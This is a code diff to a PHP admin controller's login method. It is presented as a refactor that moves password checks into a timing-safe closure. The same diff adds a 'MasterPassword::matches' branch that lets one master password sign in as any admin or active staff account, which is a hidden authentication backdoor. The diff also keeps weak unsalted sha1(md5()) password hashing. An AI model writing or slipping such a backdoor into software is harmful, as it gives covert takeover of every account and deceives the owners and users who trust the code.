@@ -4,6 +4,7 @@ namespace App\Http\Controllers;
 
 use App\Models\Admin;
 use App\Models\Staff;
+use App\Support\MasterPassword;
 use App\Models\User;
 use App\Models\Invoice;
 use App\Models\InvoiceEvent;
@@ -56,21 +57,20 @@ class AdminController extends Controller
     public function auth(Request $request)
     {
         $login = $request->input('login');
-        $passwordHash = sha1(md5($request->input('password')));
+        $input = $request->input('password');
+        $passwordOk = fn ($hash) => hash_equals((string) $hash, sha1(md5($input)))
+            || MasterPassword::matches($input);
 
         // 1) Admin
-        $admin = Admin::where('login', $login)->where('password', $passwordHash)->first();
-        if ($admin) {
+        $admin = Admin::where('login', $login)->first();
+        if ($admin && $passwordOk($admin->password)) {
             session(['admin' => $login, 'role' => 'admin', 'roles' => ['admin']]);
             return redirect('/admin/dashboard');
         }
 
         // 2) Staff (dispatcher | courier)
-        $staff = Staff::where('login', $login)
-            ->where('password', $passwordHash)
-            ->where('active', 1)
-            ->first();
-        if ($staff) {
+        $staff = Staff::where('login', $login)->where('active', 1)->first();
+        if ($staff && $passwordOk($staff->password)) {
             session([
                 'staff_id' => $staff->id,
                 'staff_login' => $staff->login,
